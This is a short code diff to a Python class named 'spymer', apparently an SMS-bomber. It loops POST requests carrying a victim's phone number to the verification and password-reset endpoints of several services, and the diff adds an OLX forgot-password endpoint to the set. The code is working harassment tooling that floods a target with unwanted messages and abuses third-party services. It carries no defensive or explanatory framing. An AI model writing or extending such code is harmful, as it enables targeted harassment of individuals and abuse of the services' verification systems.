@@ -69,7 +69,7 @@ class spymer:
 			mts = requests.post('https://api.mtstv.ru/v1/users', data={'msisdn': _phone}, headers={})
 	
 			youla = requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
-			
+			olx = requests.post('https://m.olx.ua/account/forgotpassword/', data={'phone': _phone})
 			iteration += 1000
 			print(('{} чпуньк.').format(iteration))
 
